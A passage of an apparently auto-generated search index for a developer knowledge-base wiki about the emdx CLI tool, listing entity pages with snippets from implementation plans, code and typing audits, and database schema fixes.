flags:","text":"<pre><code>emdx find \"auth\" --mode keyword    # current FTS5 behavior\nemdx find \"auth\" --mode semantic   # current emdx ai search\nemdx find \"auth\" --mode hybrid  ...\n\n- **#6099** Gameplan #3: Smart Priming\n  &gt; Instead of generic project docs, Claude gets a curated context package: recent work, key decisions, knowledge gaps, and stale docs that need attention. ## User Experience\n\n### Current (dumb prime):\n```bash\nemdx prime\n# Returns: recent docs for detect...\n\n- **#6098** Gameplan #2: Auto-Linking on Save\n  &gt; doc content ... #\n# Related docs:\n#   #6045 \"API Security Notes\" (82%)\n#   #6023 \"Architecture Decisions\" (67%)\n#   #6011 \"Session Management\" (61%)\n</code></pre>"},{"location":"entities/implementation-steps/#new-command-explore-connections","title":"New command \u2014 explore connections:","text":"<pre><code>emdx links 6100\n# #6100 \"Auth Patterns\"\n# \u251c\u2500\u2500 #60...\n\n- **#6097** Gameplan #1: Contextual Save\n  &gt; Auto-suggests tags from nearest neighbors\n# 6. Auto-assigns project from content context\n</code></pre>"},{"location":"entities/implementation-steps/#implementation-steps_2","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#step-1-add-emdx-check-command","title":"Step 1: Add <code>emdx check</code> command","text":"<ul> <li>New CLI subcommand accepting title string or piped content</li> <li> <p>Embed the input text using exis...</p> </li> <li> <p>#454 Gameplan: Optimize GUI Space Usage   Section: Gameplan: Optimize GUI Space Usage</p> </li> <li>Edit textual_browser_minimal.py:</li> <li>Change title truncation from 60 to 40 chars</li> <li>Add tag truncation at 20 chars in both setup_table() and filter_documents()</li> <li> <p>Test with current document set</p> </li> <li> <p>#419 EMDX Refresh Feature Implementation Gameplan   Section: Implementation Steps</p> <p>...15 mins)</p> </li> <li>Create <code>action_refresh_documents()</code> method in DocumentBrowser class</li> <li> <p>Implementation steps:    ```python    async def action_refresh_documents(self):        # Save current state        current_row = self.table.cursor_row        current_doc_id = self._get_s...</p> </li> <li> <p>#90 claude-knowledge-implementation</p> <p>Direct piping to mdcat for beautiful rendering</p> </li> <li>Simple but powerful - just document names and IDs</li> </ul>"},{"location":"entities/implementation-steps/#implementation-steps_3","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#proposed-multi-level-tab-system","title":"Proposed Multi-Level Tab System","text":""},{"location":"entities/implementation-steps/#option-1-prefix-based-recommended","title":"Option 1: Prefix-Based (Recommended)","text":"<p>```fish claude-view  api-design.md                    Recen... <ul> <li> <p>#26 FZF Interactive Claude List v1 Plan</p> <p>No extra complexity. ## Implementation Steps</p> </li> <li> <p>Save this plan as \"FZF Interactive Claude List v1 Plan\"</p> </li> </ul> <p>2.</p> <ul> <li>#31 Claude-List Improvement Plan v2   Section: Claude-List Improvement Plan </li> <li>Locate <code>claude-list</code> function in <code>core/claude-functions.fish</code></li> <li>Replace the complex grouped query with simple reverse-chronological query</li> <li> <p>Update column format...</p> </li> <li> <p>#32 Claude Document Templates Quick Reference   Section: For Plans</p> </li> <li>[Specific actionable step]</li> <li> <p>[Next step]</p> </li> <li> <p>#36 Claude Document Template System   Section: Quick Templates</p> </li> <li>Step one</li> <li> <p>Step two</p> </li> <li> <p>#45 Claude-List Fix Plan</p> <p>Search Within List <code>fish    claude-list --search=\"backup\"  # Filter titles containing \"backup\"</code></p> </li> <li> <p>Group by Project    ```fish    function claude-list-by-project        # Show counts per project, then allow drilling down    end   ...</p> </li> <li> <p>#6544 Delegate Enhancement Gameplans [4/5]</p> <p>Generate concise, actionable summaries \"         \"of work activity. Focus on accomplishments, blockers, and next steps.\"     )</p> <p>result = _execute_prompt(     system_prompt=system_prompt,     user_message=prompt,     title=title,  ...</p> </li> <li> <p>#247 Clauding Implementation Plan - Critical Issues Resolution   Section: Phase 1: Critical Security Fixes (Immediate - Week 1)</p> </li> <li>Create parameterized query wrapper functions</li> <li>Replace all direct SQL string concatenation</li> <li>Use PostgreSQL's <code>\\set</code> variables for safe content insertion</li> <li> <p>Implement prepared statement pattern</p> </li> <li> <p>#169 Clauding Cleanup and Reorganization Plan</p> <p>claude-view 123    ```</p> </li> </ul> <p>See docs/API-REFERENCE.md for complete documentation. ```</p>"},{"location":"entities/implementation-steps/#implementation-steps_4","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#implementation-steps_5","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#implementation-steps_6","title":"Implementation Steps","text":""},{"location":"entities/implementation-steps/#implementation-steps_7","title":"Implementation Steps:","text":""},{"location":"entities/implementation-steps/#implementation-steps_8","title":"\ud83d\udee0\ufe0f Implementation Steps","text":"<ol> <li>Create directory structure <code>bash    mkdir -p core completions sql scripts docs</code></li> </ol> <p>2.</p> <ul> <li>#43 Claude-List Simplification Plan   Section: Proposed Changes </li> <li>Update the SQL query in <code>claude-list</code> function</li> <li>Adjust column formatting for better readability</li> <li>Add optional parameter for limit (default 50)</li> <li>Consider adding <code>claude-list-all</code> for complete listing without limit</li> </ul>"},{"location":"entities/implementation-steps/#4-implementation-steps","title":"4. Implementation Steps","text":""},{"location":"entities/implementation-steps/#related-entities","title":"Related Entities","text":"<ul> <li><code>technical requirements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.3)</li> <li><code>effort estimate</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.3)</li> <li><code>related</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>how to test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.3)</li> <li><code>security notes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>reproduction</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>[title] plan</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>vision every</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>update claude.md</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> <li><code>title project modified</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/implementation/","title":"implementation:","text":"<p>Type: concept | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/implementation/#documents-9","title":"Documents (9)","text":"<ul> <li> <p>#6696 Delegate: Research noise filtering strategies for entity-based documen [1/4]   Section: Strategy 1: Heading-Specific Blocklist (Immediate, High Impact)</p> <p>Implementation: Add a check in <code>extract_entities()</code> line 197 \u2014 before <code>_add(heading, \"heading\", 0.95)</code>, filter against <code>HEADING_STOPWORDS</code> using the normalized form.</p> </li> <li> <p>#6690 Delegate: Research UX patterns for surfacing multi-method document lin [4/4]   Section: Recommendation 1: Grouped Display with Per-Method Limits</p> <p>Implementation: In <code>_print_related_docs()</code> and the <code>--links</code> table, group by <code>link[\"method\"]</code> with display limits: title_match=all, auto=all, entity_match=5 (with total count + \"use --all-links\").</p> </li> <li> <p>#6535 EMDX Future Directions: Agent-First Design [4/4]   Section: 1. Auto-Gameplan from GitHub Issues (Critical Path)</p> <p>Implementation:</p> </li> <li><code>emdx github sync</code> \u2014 pulls open issues, creates linked tasks</li> <li>LLM analyzes issue body \u2192 generates implementation plan as gameplan doc</li> <li> <p>Tags: `github, issue-123...</p> </li> <li> <p>#6533 EMDX Future Directions: Agent-First Design [1/4]   Section: Feature Idea: <code>emdx wrapup</code></p> <p>Implementation:</p> </li> <li>Query tasks updated in session window</li> <li>Query docs created in session window</li> <li>Query execution log for delegate activity</li> <li>Use AI to synthesize summary (similar to <code>distill.py</code>)</li> <li> <p>Auto-tag with <code>session-summary</code></p> </li> <li> <p>#6368 Gameplans: compact, distill, and draft-pr [synthesis]   Section: 2. <code>emdx delegate --draft</code> Flag</p> <p>Implementation:</p> </li> <li>Add <code>--draft</code> flag to delegate command</li> <li>Add validation: <code>--draft</code> requires <code>--pr</code></li> <li>Create <code>_pr_instruction(draft: bool)</code> function</li> <li>Pass <code>draft</code> through call chain</li> <li> <p>Update tests and documentation</p> </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> <p>Implementation: \u2705 Complete. Creates task with dependencies in a single transaction.</p> </li> <li> <p>#6155 Delegate: Audit the emdx CLI for dead/unused features that should be r [1/3]   Section: 5. The 'similar' Command \u2014 Works Correctly</p> <p>Implementation: Uses the <code>_require_sklearn()</code> guard pattern that's standard in the codebase.</p> </li> <li> <p>#455 Text Selection Issues Research - TUI Browser UX Problem Analysis   Section: Solution 1: TextArea Widget Migration (RECOMMENDED)</p> <p>Implementation:</p> </li> </ul> <pre><code>from textual.widgets import TextArea\n\n- **#186** EMAIL-MANAGEMENT-GUIDES\n  *Section: Categorization Methods*\n  &gt; **Implementation:**\n</code></pre>"},{"location":"entities/implementation/#retail-category-search","title":"Retail category search","text":"<p>from:(amazon.com OR ebay.com OR target.com OR walmart.com)</p>"},{"location":"entities/implementation/#related-entities","title":"Related Entities","text":"<ul> <li><code>implementation priority matrix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>action:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>rationale:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>purpose:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>future directions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.0)</li> <li><code>emdx task</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>first design</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>delete</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>--dry-run</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.8)</li> <li><code>--pr</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=3.2)</li> </ul>"},{"location":"entities/init/","title":"init","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-02-14</p>"},{"location":"entities/init/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Acceptable <code>Any</code> (Skip \u2014 Textual Framework Convention)</p> <p>These follow the Textual convention for <code>*args: Any, **kwargs: Any</code> on widget <code>__init__</code> methods. Per CLAUDE.md, these are intentional:</p> </li> <li> <p>#6537 Delegate: Document #6526 (Gameplan: Single-click highlights, double-cl   Section: 1. <code>emdx/ui/activity/activity_tree.py</code></p> <ol> <li><code>DoubleClicked</code> message class \u2014 Custom Textual message posted on double-click:    <code>python    class DoubleClicked(Message):        def __init__(self, node: TreeNode) -&gt; None:            self.node = node            super().__init__()</code></li> </ol> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 1. Changed <code>**kwargs: Any</code> to <code>**kwargs: object</code> in UI <code>__init__</code> methods</p> <p>Files modified:</p> </li> <li><code>emdx/ui/cascade/cascade_view.py</code> - <code>CascadeView.__init__</code></li> <li><code>emdx/ui/browser_container.py</code> - <code>BrowserContainer.__init__</code> and <code>exit</code> methods</li> <li> <p><code>emdx/ui/text_areas.py</code> - <code>SelectionTextArea.__init__</code> and `VimEditTextArea.__in...</p> </li> <li> <p>#6510 None Type Analysis [7/7]   Section: High Confidence \u2014 Widget State Attributes (Set in <code>compose()</code>)</p> <p>These follow a pattern where the attribute is set to None in <code>__init__</code> but always assigned in <code>compose()</code> before any access. The pattern could be simplified using late-initialization:</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Common Patterns Identified</p> </li> <li> <p>#6507 None Type Analysis [7/7]   Section: Summary Statistics</p> <p>...-----|-------| | cascade_view.py | 6 | 5 | 1 | Instance attributes initialized in <code>__init__</code> | | group_picker.py | 4 | 4 | 0 | All for message parameters | | search_presenter.py | 3 | 3 | 0 | Optional dataclass fields | | palette_presenter.py | 3 | 3 | 0 |...</p> </li> <li> <p>#6492 None Type Analysis [5/7]   Section: 1. <code>emdx/services/unified_executor.py</code></p> <p>...int | None</p> </li> </ul> <pre><code>- **Verdict: NECESSARY**\n- **Reasoning**: Initialized to `None` in `__init__`, set later when process completes. This is the standard pattern for subprocess.CompletedProcess compatibility.\n\n- **#6491** Any Type Removal Analysis [1/5]\n  *Section: 2. Line 247: `__init__` signature*\n  &gt; **Current:**\n```python\ndef __init__(self, *args: Any, **kwargs: Any) -&gt; None:\n</code></pre> <ul> <li>#6488 Any Type Removal Analysis [1/5]   Section: Occurrence 1: <code>__init__</code> parameters <p>Current signature (line 247):</p> </li> </ul> <pre><code>def __init__(self, *args: Any, **kwargs: Any) -&gt; None:\n</code></pre> <ul> <li> <p>#6486 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code></p> <p>...istry | None<code>| Returns the</code>KeybindingRegistry<code>instance or</code>None<code>| | 82 |</code>def init(self, initial_theme: str | None = None, args: Any, kwargs: Any)<code>|</code>args: object, **kwargs: object<code>| Generic App init args -</code>object<code>is safer than</code>Any` | | 8...</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: cascade/stage_summary_bar.py</p> Function Location Any Usage Replaceable? Suggested Replacement <code>__init__</code> L39 <code>**kwargs: Any</code> \u274c No Widget passthrough </li> <li> <p>#6417 Type System Audit: Replace Any/None with Concrete Types [4/4]   Section: 3. Text Area Host Protocol \u2014 <code>app_instance: Any</code> (5 occurrences)</p> <p>Locations:</p> </li> <li><code>emdx/ui/text_areas.py:21, 71</code> \u2014 <code>SelectionTextArea.__init__</code>, <code>VimEditTextArea.__init__</code></li> <li><code>emdx/ui/inputs.py:19</code> \u2014 <code>TitleInput.__init__</code></li> <li><code>emdx/ui/vim_editor.py:23</code> \u2014 <code>VimEditor.__init__</code></li> <li> <p>`emdx/ui/preview_mode_manager.py:...</p> </li> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]   Section: EMDX Config Module Bug Audit</p> <p>Audit Date: 2026-02-15 Scope: emdx/config/, emdx/init.py, emdx/main.py, emdx/main.py Auditor: Claude Code</p> </li> <li> <p>#6233 Delegate: Dead Code Audit - emdx Project [2/14]   Section: 1. UNUSED IMPORTS (High Priority)</p> </li> <li><code>emdx/config/__init__.py:3</code> - unused import: <code>get_db_path</code></li> <li><code>emdx/config/__init__.py:6</code> - 22 unused constants re-exported: <code>BRANCH_CLEANUP_DAYS</code>, <code>DEFAULT_BATCH_LIMIT</code>, `DEFAULT_BROWSE_L...</li> </ul>"},{"location":"entities/init/#1-kwargs-any-in-__init__-methods-10-occurrences","title":"1. <code>**kwargs: Any</code> in <code>__init__</code> methods (10 occurrences)","text":"<p>Solution: Replace with <code>**kwargs: object</code> \u2014 simple, low-risk change for forwarded kwargs.</p>"},{"location":"entities/init/#config-module-re-exports-many-unused","title":"Config Module Re-exports (Many unused)","text":""},{"location":"entities/init/#related-entities","title":"Related Entities","text":"<ul> <li><code>titleinput.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>documentpreviewmodal.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.8)</li> <li><code>vimedittextarea.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>vimeditor.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>self._search_service: any = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>selectiontextarea.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>emdx/ui/activity/group_picker.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>app_instance</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>emdx/ui/vim_line_numbers.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> <li><code>**kwargs: object</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.2)</li> </ul>"},{"location":"entities/initpy/","title":"init.py","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-13</p>"},{"location":"entities/initpy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/initpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...ervices/claude_executor.py<code>|</code>execute_claude_detached<code>| **NO** | re-exported in</code>init.py<code>but never imported |</code>init.py<code>export only | |</code>services/execution_service.py<code>|</code>get_execution_log_file<code>| **NO** | no | *nowhere* | |</code>services/wiki_synthesis...</p> <ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/initpy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 1. <code>emdx/config/constants.py</code> \u2014 38 dead constants</p> <p>Every constant below appears only at its definition site. No imports outside <code>config/</code> (including <code>__init__.py</code> re-exports that are themselves never imported).</p> <ul> <li>#6475 Dead Code and Error Handling Audit: emdx Project   Section: Dead Code Analysis <p>...stances) Most common patterns:</p> </li> <li>Config module re-exports: 22 unused constants in <code>__init__.py</code></li> <li>UI module re-exports: Many unused widget exports</li> <li>Type hints: <code>Optional</code>, <code>Any</code>, <code>Dict</code> imported but unused</li> <li> <p>Rich components: <code>Panel</code>, <code>Text</code> imported but unuse...</p> </li> <li> <p>#6433 Any/None typing audit [2/5]   Section: Files with NO Any usage</p> <ul> <li><code>documents.py</code> - Re-exports only, no function definitions</li> </ul> </li> <li><code>categories.py</code> - Uses only concrete types and cast()</li> <li><code>types.py</code> - TypedDict definitions only</li> <li> <p><code>__init__.py</code> - Re-exports only</p> </li> <li> <p>#6419 Type System Audit: Replace Any/None with Concrete Types [synthesis]   Section: Actionable Items</p> <p>...ences</p> </li> <li>Add <code>total=False</code> to TypedDict where fields are optional</li> <li>Update <code>__init__.py</code> delegating methods after underlying functions are typed</li> <li> <p>Consider runtime validation via dataclass conversion for strict mode (optional)</p> </li> <li> <p>#6415 Type System Audit: Replace Any/None with Concrete Types [2/4]   Section: Summary</p> <p>...High | | groups.py | 8 functions | Medium | | search.py | 1 function | Medium | | init.py (SQLiteDatabase) | 8 methods | Low (delegates) |</p> </li> <li> <p>#6363 Delegate: DEBT-15: Split the oversized emdx/database/migrations.py int [2/2]   Section: New Package Structure: <code>emdx/database/migrations/</code></p> Module Lines Contents <code>__init__.py</code> 8.0k Re-exports public API, MIGRATIONS list <code>runner.py</code> 2.9k Core infrastructure: <code>run_migrations</code>, <code>get_schema_version</code>, <code>foreign_keys_disabled</code> `c... </li> <li> <p>#6329 Delegate: Analyze emdx/utils/ and emdx/config/ for architecture improv [5/10]   Section: Current State: 16 utility files</p> File Purpose Lines Issues <code>__init__.py</code> Module docstring 12 Outdated - mentions non-existent modules <code>claude_wrapper.py</code> Execution wrapper script 241 Belongs in services/, not utils/ `... </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: Overlapping/Unclear Boundaries \u26a0\ufe0f</p> <p>Recommendation: Consolidate into a search package: ``` services/search/   init.py          # Public interface   fts_search.py        # SQLite FTS5 search   semantic_search.py   # Embeddings (from embedding_service.py)   tfidf_search.py      # TF-I...</p> </li> <li> <p>#6305 Delegate: DEBT-15 RETRY: Split the oversized migrations.py file. The f   Section: DEBT-15: Split oversized migrations.py file</p> </li> <li><code>__init__.py</code> (205 lines): Runner logic and public API</li> <li>run_migrations(db_path=None)</li> <li>get_schema_version(conn)</li> <li>set_schema_version(conn, version)</li> <li>MIGRATIONS list</li> <li> <p>Re-exports all individual migration functions</p> </li> <li> <p>#6175 Delegate: Audit emdx/utils/ for dead code. For EACH of the 18 files in [4/17]   Section: File-by-File Analysis</p> </li> <li>Status: Actively used</li> <li>Notes: Documentation-only module docstring, no dead code</li> <li> <p>Lines: 14</p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...Module</p> </li> <li>documents.py: All necessary (nullable columns, optional filters)</li> <li>init.py: All necessary (passthrough params)</li> <li>groups.py: All necessary</li> <li>cascade.py: All necessary</li> <li>search.py: All necessary</li> <li> <p>migrations.py: All necessar...</p> </li> <li> <p>#6259 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]   Section: Changes Made</p> </li> <li>logging_utils.py: TUI logging setup failure now prints to stderr as last resort</li> <li>init.py: Build ID generation fallback logged at debug level</li> </ul>"},{"location":"entities/initpy/#file-structure","title":"File Structure","text":""},{"location":"entities/initpy/#1-__init__py","title":"1. <code>__init__.py</code>","text":""},{"location":"entities/initpy/#utils-2-files","title":"Utils (2 files)","text":""},{"location":"entities/initpy/#related-entities","title":"Related Entities","text":"<ul> <li><code>use</code>from future import annotations`` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>datetime_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>wiki_synthesis_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>ui_config.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>title_normalization.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>tagging_rules.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>services/auto_tagger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>medium-term</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>structured_logger.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>logging_utils.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> </ul>"},{"location":"entities/inputtokens/","title":"input_tokens","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-14</p>"},{"location":"entities/inputtokens/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...| Total cost in USD | | <code>tokens_used</code> | INTEGER DEFAULT 0 | Total token count | | <code>input_tokens</code> | INTEGER DEFAULT 0 | Input tokens | | <code>output_tokens</code> | INTEGER DEFAULT 0 | Output tokens | | <code>output_text</code> | TEXT (nullable) | Persisted answer text |</p> </li> <li> <p>#6605 Delegate: Fix PR #687: Add ExecutionResultDict TypedDict for Execution   Section: Changes Made</p> <p>...s<code>,</code>execution_id<code>,</code>log_file<code>,</code>output_doc_id<code>,</code>output_content<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cost_usd<code>,</code>execution_time_ms<code>,</code>error_message<code>,</code>exit_code<code>,</code>cli_tool`</p> </li> <li> <p>#6604 Delegate: Add ExecutionResultDict TypedDict for ExecutionResult.to_dic   Section: Changes</p> <p>...<code>output_doc_id</code> (int | None), <code>output_content</code> (str | None), <code>tokens_used</code> (int), <code>input_tokens</code> (int), <code>output_tokens</code> (int), <code>cost_usd</code> (float), <code>execution_time_ms</code> (int), <code>error_message</code> (str | None), <code>exit_code</code> (int | None), <code>cli_tool</code> (str)</p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li><code>task_id</code> - Links executions back to the creating task</li> <li><code>cost_usd</code> - Tracks API costs in USD</li> <li><code>tokens_used</code> - Total token usage count</li> <li><code>input_tokens</code> - Input token count</li> <li> <p><code>output_tokens</code> - Output token count</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>The <code>Execution</code> dataclass includes fields like <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code>, <code>cascade_run_id</code>, and <code>task_id</code>, but <code>get_execution()</code>, <code>get_recent_executions()</code>, <code>get_running_executions()</code>, and <code>get_stale_executions()</code> do not...</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 036 columns:</li> </ol> </li> <li><code>task_id</code> - Links execution to tasks</li> <li><code>cost_usd</code> - API cost tracking</li> <li><code>tokens_used</code> - Total token usage</li> <li><code>input_tokens</code> - Input token tracking</li> <li> <p><code>output_tokens</code> - Output token tracking</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...<code>cost_usd</code>: Actual cost from Claude API</p> </li> <li><code>tokens_used</code>: Total tokens consumed</li> <li><code>input_tokens</code>: Input tokens</li> <li> <p><code>output_tokens</code>: Output tokens</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...s:</p> </li> <li><code>cascade_run_id</code> (migration 031)</li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li>Refactored all SELECT queries to use shared <code>_EXECUTION_COLUMNS</code> constant</li> <li> <p>Added `_row_to_e...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...from migrations 031/036: <code>cascade_run_id</code>, <code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code></p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>...| Actual cost from Claude API | | <code>tokens_used</code> | 036 | Total tokens consumed | | <code>input_tokens</code> | 036 | Input tokens | | <code>output_tokens</code> | 036 | Output tokens |</p> </li> </ul>"},{"location":"entities/inputtokens/#from-migration-036","title":"From Migration 036","text":""},{"location":"entities/inputtokens/#related-entities","title":"Related 